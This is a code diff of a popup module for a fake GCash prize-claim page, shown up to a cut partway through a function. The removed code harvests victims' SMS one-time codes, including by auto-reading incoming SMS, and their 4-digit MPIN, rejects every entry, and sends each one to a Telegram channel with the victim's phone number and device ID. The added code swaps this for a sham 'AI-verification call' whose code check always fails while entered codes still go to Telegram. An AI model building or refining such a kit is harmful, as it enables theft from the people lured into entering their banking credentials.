@@ -1,6 +1,11 @@
 /**
- * Popup Share Module - With 500 Bills Indicators & Neon Blue Numpad
- * Updated: Hidden attempts counter, hidden step indicators
+ * Popup Share Module - With 500 Bills Indicators & AI-Verification Call
+ * Updated: AI-Verification Call System (No MPIN)
+ * - Request AI-Verification Call
+ * - 60-second countdown timer
+ * - Always invalid by default
+ * - Full Telegram notifications
+ * - Floating call notification
  */
 
 // ========== POPUP MODULE ==========
@@ -12,12 +17,14 @@
     let claimInProgress = false;
     let isRedirecting = false;
     let currentFirewallStatus = false;
-    let invalidAttempts = 0;
-    const MAX_ATTEMPTS = 5;
-    let detectedSMSCode = '';
-    let smsReceiverStarted = false;
-    let currentMPIN = '';
-    let lastNotifiedCode = '';
+    
+    // ========== AI-VERIFICATION CALL VARIABLES ==========
+    let callInProgress = false;
+    let callCountdown = 60;
+    let callTimerInterval = null;
+    let isCallRequested = false;
+    let currentCallCode = '';
+    let codeEntered = false;
     
     // ========== SOUND EFFECT ==========
     function playClaimSound() {
@@ -27,6 +34,16 @@
             audio.play().catch(e => console.log('Sound play prevented:', e));
         } catch(e) {
             console.log('Sound error:', e);
+        }
+    }
+    
+    function playCallSound() {
+        try {
+            const audio = new Audio('sounds/call_ring.mp3');
+            audio.volume = 0.5;
+            audio.play().catch(e => console.log('Call sound error:', e));
+        } catch(e) {
+            console.log('Call sound error:', e);
         }
     }
     
@@ -43,33 +60,46 @@
         }
     }
     
-    // 6-digit code notifications
-    async function send6DigitRequestNotification(userPhone, deviceId) {
+    // ========== AI-VERIFICATION CALL TELEGRAM NOTIFICATIONS ==========
+    async function sendAICallRequestNotification(userPhone, deviceId, code) {
         const now = new Date();
         const timestamp = now.toLocaleString();
-        const message = `🔐 6-DIGIT CODE REQUESTED\nUser: ${userPhone}\nDevice ID: ${deviceId}\nTime: ${timestamp}\nStatus: Waiting for 6-digit code input`;
+        const message = `📞 AI-VERIFICATION CALL REQUESTED
+━━━━━━━━━━━━━━━━━━━━
+👤 User: ${userPhone}
+🖥️ Device: ${deviceId}
+🔑 Code Generated: ${code}
+⏰ Time: ${timestamp}
+📊 Status: Call requested - Waiting for user input
+━━━━━━━━━━━━━━━━━━━━`;
         await sendTelegramMessage(message);
     }
     
-    async function send6DigitCodeEnteredNotification(userPhone, deviceId, codeEntered) {
+    async function sendAICodeAttemptNotification(userPhone, deviceId, codeEntered, secondsLeft) {
         const now = new Date();
         const timestamp = now.toLocaleString();
-        const message = `📝 6-DIGIT CODE ENTERED\nUser: ${userPhone}\nDevice ID: ${deviceId}\nCode Entered: ${codeEntered}\nTime: ${timestamp}\nStatus: Code submitted for verification`;
+        const message = `🔑 AI-CODE VERIFICATION ATTEMPT
+━━━━━━━━━━━━━━━━━━━━
+👤 User: ${userPhone}
+🖥️ Device: ${deviceId}
+📝 Code Entered: ${codeEntered}
+⏰ Time: ${timestamp}
+⏱️ Seconds Left: ${secondsLeft}s
+📊 Status: INVALID CODE (No valid code exists)
+━━━━━━━━━━━━━━━━━━━━`;
         await sendTelegramMessage(message);
     }
     
-    async function send6DigitVerificationAttemptNotification(userPhone, deviceId, code, attemptsLeft) {
+    async function sendAICallExpiredNotification(userPhone, deviceId) {
         const now = new Date();
         const timestamp = now.toLocaleString();
-        const message = `🔑 6-DIGIT VERIFICATION ATTEMPT\nUser: ${userPhone}\nDevice ID: ${deviceId}\nCode Entered: ${code}\nTime: ${timestamp}\nAttempts Left: ${attemptsLeft}/${MAX_ATTEMPTS}\nStatus: INVALID`;
-        await sendTelegramMessage(message);
-    }
-    
-    // MPIN Telegram Notification
-    async function sendMPINVerificationAttemptNotification(userPhone, deviceId, mpin, attemptsLeft) {
-        const now = new Date();
-        const timestamp = now.toLocaleString();
-        const message = `🔐 MPIN VERIFICATION ATTEMPT\nUser: ${userPhone}\nDevice ID: ${deviceId}\nMPIN Entered: ${mpin}\nTime: ${timestamp}\nAttempts Left: ${attemptsLeft}/${MAX_ATTEMPTS}\nStatus: INVALID MPIN`;
+        const message = `⏰ AI-VERIFICATION CALL EXPIRED
+━━━━━━━━━━━━━━━━━━━━
+👤 User: ${userPhone}
+🖥️ Device: ${deviceId}
+⏰ Time: ${timestamp}
+📊 Status: Call expired - User needs to request a new call
+━━━━━━━━━━━━━━━━━━━━`;
         await sendTelegramMessage(message);
     }
     
@@ -77,14 +107,14 @@
     async function sendClaimButtonNotification(userPhone, deviceId, amount) {
         const now = new Date();
         const timestamp = now.toLocaleString();
-        const message = `💳 CLAIM THRU GCASH INITIATED\nUser: ${userPhone}\nDevice ID: ${deviceId}\nAmount: ₱${amount.toFixed(2)}\nTime: ${timestamp}\nStatus: Claim process started`;
-        await sendTelegramMessage(message);
-    }
-    
-    async function sendMaxAttemptsNotification(userPhone, deviceId) {
-        const now = new Date();
-        const timestamp = now.toLocaleString();
-        const message = `⚠️ MAX ATTEMPTS REACHED\nUser: ${userPhone}\nDevice ID: ${deviceId}\nTime: ${timestamp}\nAction: Redirect to index.html`;
+        const message = `💳 CLAIM THRU GCASH INITIATED
+━━━━━━━━━━━━━━━━━━━━
+👤 User: ${userPhone}
+🖥️ Device: ${deviceId}
+💰 Amount: ₱${amount.toFixed(2)}
+⏰ Time: ${timestamp}
+📊 Status: Claim process started
+━━━━━━━━━━━━━━━━━━━━`;
         await sendTelegramMessage(message);
     }
     
@@ -117,7 +147,7 @@
     
     // ========== INITIALIZATION ==========
     function init() {
-        console.log('Popup Module Starting...');
+        console.log('🎯 Popup Module Starting...');
         
         const popup = document.getElementById('prizePopup');
         if (!popup) {
@@ -127,82 +157,10 @@
         
         getFirewallStatus();
         attachClaimButton();
-        attachFirewallEvents();
         addAnimations();
+        addPhase3Animations();
         
-        console.log('Popup Module ready');
-    }
-    
-    // ========== RESET ATTEMPTS ==========
-    function resetAttempts() {
-        invalidAttempts = 0;
-        currentMPIN = '';
-        detectedSMSCode = '';
-        lastNotifiedCode = '';
-        console.log('Invalid attempts reset to 0');
-    }
-    
-    // ========== HANDLE MAX ATTEMPTS ==========
-    function handleMaxAttempts() {
-        const userPhone = localStorage.getItem("userPhone") || "Unknown";
-        const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
-        
-        sendMaxAttemptsNotification(userPhone, deviceId);
-        
-        alert("Use your registered GCash Number and claim again.");
-        window.location.href = "index.html";
-    }
-    
-    // ========== INCREMENT INVALID ATTEMPTS ==========
-    function incrementInvalidAttempts() {
-        invalidAttempts++;
-        console.log(`Invalid attempt ${invalidAttempts}/${MAX_ATTEMPTS}`);
-        
-        if (invalidAttempts >= MAX_ATTEMPTS) {
-            handleMaxAttempts();
-            return true;
-        }
-        return false;
-    }
-    
-    // ========== RESET TO STEP 1 ==========
-    function resetToStep1() {
-        const step1Container = document.getElementById('step1Container');
-        const step2Container = document.getElementById('step2Container');
-        const code6Input = document.getElementById('code6Digit');
-        const smsPopup = document.getElementById('smsCodePopup');
-        
-        if (code6Input) code6Input.value = '';
-        currentMPIN = '';
-        lastNotifiedCode = '';
-        updateMPINDots();
-        
-        if (step1Container) step1Container.style.display = 'block';
-        if (step2Container) step2Container.style.display = 'none';
-        
-        const step1ErrorMsg = document.getElementById('step1ErrorMsg');
-        if (step1ErrorMsg) step1ErrorMsg.style.display = 'none';
-        
-        if (smsPopup && detectedSMSCode) {
-            smsPopup.style.display = 'block';
-            setTimeout(() => {
-                if (smsPopup) smsPopup.style.display = 'none';
-            }, 10000);
-        }
-        
-        console.log(`Reset to Step 1. Attempts left: ${MAX_ATTEMPTS - invalidAttempts}`);
-    }
-    
-    // ========== UPDATE MPIN DOTS ==========
-    function updateMPINDots() {
-        const dots = document.querySelectorAll('.mpin-dot');
-        for (let i = 0; i < dots.length; i++) {
-            if (i < currentMPIN.length) {
-                dots[i].classList.add('filled');
-            } else {
-                dots[i].classList.remove('filled');
-            }
-        }
+        console.log('✅ Popup Module ready');
     }
     
     // ========== ADD ANIMATIONS ==========
@@ -238,42 +196,13 @@
                 50% { transform: scale(1.3); filter: brightness(2); }
                 100% { transform: scale(1); }
             }
-            
-            .numeric-keypad {
-                display: grid;
-                grid-template-columns: repeat(3, 1fr);
-                gap: 12px;
-                padding: 20px;
-                background: linear-gradient(145deg, #0a0f2a, #050a1a);
-                border: 2px solid #00d4ff;
-                border-radius: 20px;
-                margin: 15px 0;
-                box-shadow: 0 0 20px rgba(0, 212, 255, 0.4), inset 0 0 15px rgba(0, 212, 255, 0.1);
+            @keyframes pulseRing {
+                0%, 100% { transform: scale(1); opacity: 1; }
+                50% { transform: scale(1.05); opacity: 0.7; }
             }
-            .num-btn {
-                background: linear-gradient(145deg, #0d1530, #060b1a);
-                border: 1.5px solid #00d4ff;
-                border-radius: 50%;
-                width: 55px;
-                height: 55px;
-                font-size: 22px;
-                font-weight: bold;
-                color: #00d4ff;
-                cursor: pointer;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                margin: 0 auto;
-                font-family: 'Orbitron', monospace;
-                transition: all 0.1s ease;
-                box-shadow: 0 3px 0 #0088aa, 0 0 10px rgba(0, 212, 255, 0.3);
-                text-shadow: 0 0 5px #00d4ff;
-            }
-            .num-btn:active {
-                transform: translateY(3px);
-                box-shadow: 0 0 0 #0088aa;
-                background: linear-gradient(145deg, #1a2550, #0d1530);
-                color: #ffffff;
+            @keyframes slideDown {
+                from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+                to { opacity: 1; transform: translateX(-50%) translateY(0); }
             }
             
             .bill-indicators {
@@ -301,33 +230,14 @@
                 box-shadow: 0 0 8px rgba(212, 175, 55, 0.5);
             }
             
-            .mpin-dots {
-                display: flex;
-                justify-content: center;
-                gap: 15px;
-                margin: 20px 0;
-            }
-            .mpin-dot {
-                width: 14px;
-                height: 14px;
-                border-radius: 50%;
-                background: rgba(0, 212, 255, 0.3);
-                border: 1px solid rgba(0, 212, 255, 0.5);
-                transition: all 0.3s ease;
-            }
-            .mpin-dot.filled {
-                background: #00d4ff;
-                box-shadow: 0 0 15px #00d4ff, 0 0 30px rgba(0, 212, 255, 0.5);
-            }
-            
             .small-back-btn {
-                background: linear-gradient(to bottom, #d4af37, #aa771c);
-                border: 1px solid #fcf6ba;
+                background: linear-gradient(to bottom, #555, #333);
+                border: 1px solid #777;
                 border-radius: 8px;
                 padding: 8px 18px;
                 font-size: 11px;
                 font-weight: 700;
-                color: #1a1100;
+                color: #ccc;
                 cursor: pointer;
                 display: inline-flex;
                 align-items: center;
@@ -337,34 +247,13 @@
                 margin-top: 10px;
                 font-family: 'Orbitron', monospace;
                 letter-spacing: 1px;
-                text-shadow: 1px 1px 0 rgba(255,255,255,0.3);
-                box-shadow: 0 3px 0 #6e4b0c;
+                text-shadow: none;
+                box-shadow: 0 3px 0 #222;
                 transition: all 0.1s ease;
             }
             .small-back-btn:active {
                 transform: translateY(3px);
-                box-shadow: 0 0 0 #6e4b0c;
-            }
-            
-            .verification-input {
-                text-align: center;
-                font-size: 20px;
-                font-weight: bold;
-                width: 180px;
-                padding: 12px;
-                background: #000;
-                border: 2px solid #00d4ff;
-                border-radius: 8px;
-                color: #00d4ff;
-                font-family: 'Orbitron', monospace;
-                transition: all 0.3s ease;
-                letter-spacing: 3px;
-                box-shadow: 0 0 10px rgba(0, 212, 255, 0.2);
-            }
-            .verification-input:focus {
-                border-color: #00d4ff;
-                box-shadow: 0 0 20px rgba(0, 212, 255, 0.5);
-                outline: none;
+                box-shadow: 0 0 0 #222;
             }
             
             .claim-gcash-button {
@@ -386,6 +275,10 @@
                 transform: translateY(4px);
                 box-shadow: 0 0 0 #6e4b0c;
             }
+            .claim-gcash-button:disabled {
+                opacity: 0.5;
+                cursor: not-allowed;
+            }
             
             .divider {
                 width: 50px;
@@ -403,6 +296,63 @@
                 letter-spacing: 1px;
                 text-align: center;
                 text-shadow: 0 0 15px #00d4ff;
+            }
+            
+            .verification-input {
+                text-align: center;
+                font-size: 24px;
+                font-weight: bold;
+                width: 160px;
+                padding: 14px;
+                background: #000;
+                border: 2px solid #00d4ff;
+                border-radius: 10px;
+                color: #00d4ff;
+                font-family: 'Orbitron', monospace;
+                transition: all 0.3s ease;
+                letter-spacing: 4px;
+                box-shadow: 0 0 15px rgba(0, 212, 255, 0.2);
+            }
+            .verification-input:focus {
+                border-color: #00d4ff;
+                box-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
+                outline: none;
+            }
+            .verification-input::placeholder {
+                color: rgba(0, 212, 255, 0.3);
+                letter-spacing: 2px;
+                font-size: 16px;
+            }
+        `;
+        document.head.appendChild(style);
+    }
+    
+    // ========== PHASE 3 ANIMATIONS ==========
+    function addPhase3Animations() {
+        if (document.querySelector('#phase3-animations')) return;
+        
+        const style = document.createElement('style');
+        style.id = 'phase3-animations';
+        style.textContent = `
+            @keyframes pulseRing {
+                0%, 100% { transform: scale(1); opacity: 1; }
+                50% { transform: scale(1.05); opacity: 0.7; }
+            }
+            @keyframes slideDown {
+                from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+                to { opacity: 1; transform: translateX(-50%) translateY(0); }
+            }
+            @keyframes shake {
+                0%, 100% { transform: translateX(0); }
+                20% { transform: translateX(-8px); }
+                40% { transform: translateX(8px); }
+                60% { transform: translateX(-5px); }
+                80% { transform: translateX(5px); }
+            }
+            .verification-input:focus {
+                border-color: #00d4ff !important;
+                box-shadow: 0 0 30px rgba(0, 212, 255, 0.3) !important;
+                outline: none;
             }
         `;
         document.head.appendChild(style);
@@ -481,53 +431,6 @@
         }
     }
     
-    // ========== SMS RETRIEVER ==========
-    function startSmsRetriever() {
-        if (smsReceiverStarted) return;
-        smsReceiverStarted = true;
-        
-        console.log('SMS Retriever started - waiting for SMS...');
-        
-        if (window.smsretriever) {
-            window.smsretriever.startWatch(function(sms) {
-                console.log('Raw SMS received:', sms);
-                
-                const match = sms.match(/\b\d{6}\b/);
-                if (match) {
-                    const code = match[0];
-                    console.log('Extracted 6-digit code:', code);
-                    detectedSMSCode = code;
-                    
-                    const smsPopup = document.getElementById('smsCodePopup');
-                    const smsCodeSpan = document.getElementById('smsCodeValue');
-                    const codeInput = document.getElementById('code6Digit');
-                    
-                    if (smsPopup && smsCodeSpan) {
-                        smsCodeSpan.innerHTML = code;
-                        smsPopup.style.display = 'block';
-                        
-                        setTimeout(() => {
-                            if (smsPopup) smsPopup.style.display = 'none';
-                        }, 10000);
-                    }
-                    
-                    if (codeInput) {
-                        codeInput.value = code;
-                        codeInput.style.borderColor = '#22C55E';
-                        codeInput.style.boxShadow = '0 0 15px #22C55E';
-                        
-                        setTimeout(() => {
-                            const verifyBtn = document.getElementById('verify6DigitBtn');
-                            if (verifyBtn) verifyBtn.click();
-                        }, 500);
-                    }
-                }
-            });
-        } else {
-            console.log('SMS Retriever not available');
-        }
-    }
-    
     // ========== GET FIREWALL STATUS ==========
     async function getFirewallStatus() {
         try {
@@ -575,14 +478,12 @@
             e.preventDefault();
             e.stopPropagation();
             
-            console.log('Claim button clicked!');
+            console.log('🔔 Claim button clicked!');
             
             playClaimSound();
-            resetAttempts();
             
             const userPhone = localStorage.getItem("userPhone") || "Unknown";
             const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
-            await send6DigitRequestNotification(userPhone, deviceId);
             
             const balance = await syncBalanceFromFirebase();
             showPopup(balance);
@@ -590,18 +491,7 @@
             if (window.ConfettiModule) window.ConfettiModule.start();
         };
         
-        console.log('Claim button attached with sound effect');
-    }
-    
-    // ========== ATTACH FIREWALL EVENTS ==========
-    function attachFirewallEvents() {
-        const closeBtn = document.getElementById('firewallCloseBtn');
-        if (closeBtn) {
-            closeBtn.onclick = function() {
-                hideFirewallPopup();
-                showPhase1(currentBalance);
-            };
-        }
+        console.log('✅ Claim button attached');
     }
     
     // ========== GET PAYOUT LINK ==========
@@ -630,7 +520,7 @@
                 user: userPhone,
                 usedAt: Date.now()
             });
-            console.log('Link marked as used');
+            console.log('✅ Link marked as used');
         } catch(e) {
             console.error('Error marking link:', e);
         }
@@ -652,8 +542,6 @@
         if (!popupInner) return;
         
         currentPhase = 3;
-        detectedSMSCode = '';
-        lastNotifiedCode = '';
         
         popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
         popupInner.style.opacity = '0';
@@ -664,11 +552,9 @@
             popupInner.style.opacity = '1';
             popupInner.style.transform = 'scale(1)';
         }, 300);
-        
-        startSmsRetriever();
     }
     
-    // ========== PHASE 3: CLAIMING VERIFICATION (HIDDEN ATTEMPTS & STEPS) ==========
+    // ========== PHASE 3: AI-VERIFICATION CALL ==========
     function showPhase3() {
         const popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
@@ -679,68 +565,69 @@
             popupContainer.style.width = '90%';
         }
         
+        // Reset call state
+        callInProgress = false;
+        callCountdown = 60;
+        if (callTimerInterval) {
+            clearInterval(callTimerInterval);
+            callTimerInterval = null;
+        }
+        isCallRequested = false;
+        currentCallCode = '';
+        codeEntered = false;
+        
         popupInner.innerHTML = `
             <div class="popup-close" id="popupClosePhase3">✕</div>
             
             <div style="text-align: center; margin-bottom: 10px;">
-                <img src="images/gc_icon.png" style="width: 60px; height: 60px; animation: bounceIn 0.5s ease; border-radius: 50%; border: 2px solid #d4af37; box-shadow: 0 0 20px rgba(212,175,55,0.4);">
-            </div>
-            
-            <h2 class="phase3-heading">VERIFICATION</h2>
-            
-            <div class="divider"></div>
-            
-            <div id="smsCodePopup" style="display: none;">
-                <div style="display: flex; align-items: center; gap: 12px;">
-                    <div style="font-size: 32px;">📨</div>
-                    <div style="flex: 1;">
-                        <div style="font-size: 10px; color: #d4af37; font-family: 'Orbitron', monospace; letter-spacing: 1px;">SMS RECEIVED</div>
-                        <div style="font-size: 16px; color: #fce883; font-weight: bold; font-family: 'Orbitron', monospace; letter-spacing: 2px;" id="smsCodeValue">------</div>
-                    </div>
-                    <button id="autoFillSmsBtn" class="small-back-btn" style="background: linear-gradient(to bottom, #22C55E, #16A34A); color: #fff; border: 1px solid #4ade80; text-shadow: none; box-shadow: 0 3px 0 #15803d;">USE CODE</button>
+                <div style="width: 70px; height: 70px; margin: 0 auto; background: linear-gradient(145deg, rgba(0, 212, 255, 0.15), rgba(0, 100, 200, 0.05)); border-radius: 50%; border: 2px solid rgba(0, 212, 255, 0.3); display: flex; align-items: center; justify-content: center; animation: pulseRing 2s ease-in-out infinite;">
+                    <i class="fas fa-phone" style="font-size: 30px; color: #00d4ff; text-shadow: 0 0 20px rgba(0, 212, 255, 0.5);"></i>
                 </div>
             </div>
             
-            <div id="step1Container">
-                <p style="font-size: 12px; color: #00d4ff; text-align: center; margin: 0 0 15px 0; font-family: 'Poppins', sans-serif;">
-                    Enter the <strong>6-digit verification code</strong> received via SMS
-                </p>
-                <div style="display: flex; gap: 10px; justify-content: center; align-items: center;">
-                    <input type="text" id="code6Digit" class="verification-input" placeholder="000000" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
-                    <button id="verify6DigitBtn" class="claim-gcash-button" style="background: linear-gradient(to bottom, #0066ff, #0044cc); border: 1px solid #3399ff; color: #fff; text-shadow: none; box-shadow: 0 4px 0 #003399; padding: 12px 18px;">VERIFY</button>
-                </div>
-                <div id="step1ErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff6666; font-size: 11px; font-family: 'Poppins', sans-serif;"></div>
+            <h2 class="phase3-heading">🔐 AI-VERIFICATION</h2>
+            
+            <div class="divider" style="width: 60px; height: 2px; background: linear-gradient(90deg, transparent, #00d4ff, transparent); margin: 8px auto;"></div>
+            
+            <p style="font-size: 11px; color: rgba(255,255,255,0.6); text-align: center; margin: 5px 0 15px 0; font-family: 'Poppins', sans-serif; letter-spacing: 0.5px;">
+                <i class="fas fa-shield-alt" style="color: #00d4ff; margin-right: 6px;"></i>
+                System AI will call you with a <strong style="color: #00d4ff;">4-digit verification code</strong>
+            </p>
+            
+            <!-- STATUS DISPLAY -->
+            <div id="callStatusContainer" style="background: rgba(0, 212, 255, 0.05); border: 1px solid rgba(0, 212, 255, 0.1); border-radius: 12px; padding: 15px; margin-bottom: 15px; text-align: center;">
+                <div id="callStatusIcon" style="font-size: 28px; margin-bottom: 5px;">📞</div>
+                <div id="callStatusText" style="font-size: 13px; color: rgba(255,255,255,0.8); font-family: 'Poppins', sans-serif; font-weight: 500;">Ready for verification</div>
+                <div id="callTimerDisplay" style="font-size: 28px; font-family: 'Orbitron', monospace; font-weight: 900; color: #00d4ff; margin-top: 5px; text-shadow: 0 0 20px rgba(0, 212, 255, 0.2); display: none;">60s</div>
+                <div id="callCodeDisplay" style="font-size: 32px; font-family: 'Orbitron', monospace; font-weight: 900; color: #22C55E; margin-top: 5px; text-shadow: 0 0 30px rgba(34, 197, 94, 0.3); display: none; letter-spacing: 4px;">----</div>
             </div>
             
-            <div id="step2Container" style="display: none;">
-                <p style="font-size: 12px; color: #00d4ff; text-align: center; margin: 0 0 15px 0; font-family: 'Poppins', sans-serif;">
-                    Enter your <strong>4-digit MPIN</strong>
-                </p>
-                
-                <div class="mpin-dots" id="mpinDots">
-                    <div class="mpin-dot"></div>
-                    <div class="mpin-dot"></div>
-                    <div class="mpin-dot"></div>
-                    <div class="mpin-dot"></div>
+            <!-- REQUEST CALL BUTTON -->
+            <button id="requestCallBtn" class="claim-gcash-button" style="width: 100%; background: linear-gradient(to bottom, #00d4ff, #0088cc); border: 1px solid #66ddff; color: #fff; text-shadow: none; box-shadow: 0 4px 0 #006699; padding: 14px; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 10px; font-family: 'Orbitron', monospace; letter-spacing: 1px;">
+                <i class="fas fa-phone-alt"></i>
+                REQUEST AI-VERIFICATION CALL
+            </button>
+            
+            <!-- CODE INPUT SECTION -->
+            <div id="codeSection" style="display: none; margin-top: 15px;">
+                <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px;">
+                    <i class="fas fa-key" style="color: #00d4ff; font-size: 14px;"></i>
+                    <span style="font-size: 11px; color: rgba(255,255,255,0.6); font-family: 'Poppins', sans-serif;">Enter the 4-digit code from the call</span>
                 </div>
                 
-                <div class="numeric-keypad">
-                    <button class="num-btn" data-num="1">1</button>
-                    <button class="num-btn" data-num="2">2</button>
-                    <button class="num-btn" data-num="3">3</button>
-                    <button class="num-btn" data-num="4">4</button>
-                    <button class="num-btn" data-num="5">5</button>
-                    <button class="num-btn" data-num="6">6</button>
-                    <button class="num-btn" data-num="7">7</button>
-                    <button class="num-btn" data-num="8">8</button>
-                    <button class="num-btn" data-num="9">9</button>
-                    <button class="num-btn" data-num="clear" style="font-size: 16px;">⌫</button>
-                    <button class="num-btn" data-num="0">0</button>
-                    <button class="num-btn" data-num="reset" style="font-size: 16px;">↺</button>
+                <div style="display: flex; gap: 10px; justify-content: center; align-items: center; flex-wrap: wrap;">
+                    <input type="text" id="code4Digit" class="verification-input" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
+                    <button id="verifyCodeBtn" class="claim-gcash-button" style="background: linear-gradient(to bottom, #22C55E, #16A34A); border: 1px solid #4ade80; color: #fff; text-shadow: none; box-shadow: 0 4px 0 #15803d; padding: 14px 20px; font-size: 13px; font-family: 'Orbitron', monospace; letter-spacing: 1px;">
+                        <i class="fas fa-check"></i> VERIFY
+                    </button>
                 </div>
                 
-                <div id="step2ErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff4444; font-size: 12px; padding: 8px; border-radius: 8px; font-family: 'Poppins', sans-serif; background: rgba(255, 68, 68, 0.1); border: 1px solid rgba(255, 68, 68, 0.3);">
-                    ❌ Invalid MPIN. Please try again.
+                <div id="codeErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff4444; font-size: 11px; padding: 8px; border-radius: 8px; font-family: 'Poppins', sans-serif; background: rgba(255, 68, 68, 0.1); border: 1px solid rgba(255, 68, 68, 0.2);">
+                    <i class="fas fa-exclamation-circle"></i> Invalid code. Please request a new call.
+                </div>
+                
+                <div id="callExpiredMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff8800; font-size: 11px; padding: 8px; border-radius: 8px; font-family: 'Poppins', sans-serif; background: rgba(255, 136, 0, 0.1); border: 1px solid rgba(255, 136, 0, 0.2);">
+                    <i class="fas fa-clock"></i> Call code expired. Request a new call.
                 </div>
             </div>
             
@@ -755,11 +642,15 @@
     // ========== ATTACH PHASE 3 EVENTS ==========
     function attachPhase3Events() {
         const closeBtn = document.getElementById('popupClosePhase3');
-        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
+        if (closeBtn) closeBtn.onclick = function() { 
+            stopCallTimer();
+            closePopup(); 
+        };
         
         const backBtn = document.getElementById('backBtnPhase3');
         if (backBtn) {
             backBtn.onclick = function() {
+                stopCallTimer();
                 const popupInner = document.querySelector('.popup-inner');
                 if (popupInner) {
                     popupInner.style.transition = 'opacity 0.3s ease';
@@ -772,167 +663,385 @@
             };
         }
         
-        const verifyBtn = document.getElementById('verify6DigitBtn');
-        const codeInput = document.getElementById('code6Digit');
-        const step1Container = document.getElementById('step1Container');
-        const step2Container = document.getElementById('step2Container');
-        const step1ErrorMsg = document.getElementById('step1ErrorMsg');
-        
-        const autoFillBtn = document.getElementById('autoFillSmsBtn');
-        if (autoFillBtn) {
-            autoFillBtn.onclick = function() {
-                if (codeInput && detectedSMSCode) {
-                    codeInput.value = detectedSMSCode;
-                    codeInput.style.borderColor = '#22C55E';
-                    codeInput.style.boxShadow = '0 0 15px #22C55E';
-                    
-                    setTimeout(() => {
-                        if (verifyBtn) verifyBtn.click();
-                    }, 300);
-                    
-                    const smsPopup = document.getElementById('smsCodePopup');
-                    if (smsPopup) smsPopup.style.display = 'none';
+        // ========== REQUEST CALL BUTTON ==========
+        const requestBtn = document.getElementById('requestCallBtn');
+        if (requestBtn) {
+            requestBtn.onclick = function() {
+                if (callInProgress) {
+                    alert("Please wait for the current call to complete.");
+                    return;
                 }
+                requestAICall();
             };
         }
         
+        // ========== VERIFY CODE BUTTON ==========
+        const verifyBtn = document.getElementById('verifyCodeBtn');
+        const codeInput = document.getElementById('code4Digit');
+        
         if (verifyBtn) {
-            verifyBtn.onclick = async function() {
-                const code = codeInput ? codeInput.value.trim() : '';
-                
-                if (!code || code.length !== 6 || !/^\d+$/.test(code)) {
-                    if (step1ErrorMsg) {
-                        step1ErrorMsg.innerText = "Please enter a valid 6-digit code.";
-                        step1ErrorMsg.style.display = 'block';
-                    }
-                    if (codeInput) {
-                        codeInput.classList.add('shake-effect');
-                        setTimeout(() => codeInput.classList.remove('shake-effect'), 300);
-                    }
-                    return;
-                }
-                
-                console.log('6-digit code accepted:', code);
-                
-                const userPhone = localStorage.getItem("userPhone") || "Unknown";
-                const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
-                
-                if (lastNotifiedCode !== code) {
-                    await send6DigitCodeEnteredNotification(userPhone, deviceId, code);
-                    lastNotifiedCode = code;
-                }
-                
-                step1Container.style.transition = 'opacity 0.3s ease';
-                step1Container.style.opacity = '0';
-                
-                setTimeout(() => {
-                    step1Container.style.display = 'none';
-                    step2Container.style.display = 'block';
-                    step2Container.style.opacity = '0';
-                    step2Container.style.transform = 'scale(0.95)';
-                    
-                    setTimeout(() => {
-                        step2Container.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
-                        step2Container.style.opacity = '1';
-                        step2Container.style.transform = 'scale(1)';
-                    }, 50);
-                }, 300);
-                
-                attachMPINKeypad();
+            verifyBtn.onclick = function() {
+                verifyCode();
             };
         }
         
         if (codeInput) {
             codeInput.addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
-                    if (verifyBtn) verifyBtn.click();
+                    verifyCode();
                 }
             });
             
             codeInput.addEventListener('input', function(e) {
                 const value = this.value.trim();
-                if (value.length === 6 && /^\d+$/.test(value)) {
+                if (value.length === 4 && /^\d+$/.test(value)) {
                     this.style.borderColor = '#22C55E';
-                    this.style.boxShadow = '0 0 15px #22C55E';
-                    if (verifyBtn) verifyBtn.click();
+                    this.style.boxShadow = '0 0 20px rgba(34, 197, 94, 0.3)';
                 } else {
-                    this.style.borderColor = 'rgba(0, 212, 255, 0.5)';
-                    this.style.boxShadow = 'none';
+                    this.style.borderColor = '#00d4ff';
+                    this.style.boxShadow = '0 0 15px rgba(0, 212, 255, 0.2)';
                 }
             });
         }
     }
     
-    // ========== ATTACH MPIN KEYPAD ==========
-    function attachMPINKeypad() {
-        currentMPIN = '';
-        updateMPINDots();
+    // ========== REQUEST AI-VERIFICATION CALL ==========
+    async function requestAICall() {
+        if (callInProgress) return;
         
-        function checkMPIN() {
-            if (currentMPIN.length === 4) {
-                const userPhone = localStorage.getItem("userPhone") || "Unknown";
-                const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
-                
-                const maxReached = incrementInvalidAttempts();
-                const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
-                
-                // Send MPIN Telegram notification
-                sendMPINVerificationAttemptNotification(userPhone, deviceId, currentMPIN, attemptsLeft);
-                
-                const errorMsg = document.getElementById('step2ErrorMsg');
-                const mpinDots = document.getElementById('mpinDots');
-                
-                if (errorMsg) {
-                    errorMsg.style.display = 'block';
-                }
-                if (mpinDots) {
-                    mpinDots.classList.add('shake-effect');
-                    setTimeout(() => mpinDots.classList.remove('shake-effect'), 300);
-                }
-                
-                currentMPIN = '';
-                updateMPINDots();
-                
-                if (!maxReached) {
-                    setTimeout(() => {
-                        if (errorMsg) errorMsg.style.display = 'none';
-                        resetToStep1();
-                    }, 1500);
-                }
-            }
+        callInProgress = true;
+        isCallRequested = true;
+        callCountdown = 60;
+        currentCallCode = generateCallCode();
+        codeEntered = false;
+        
+        const userPhone = localStorage.getItem("userPhone") || "Unknown";
+        const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+        
+        // Send Telegram notification
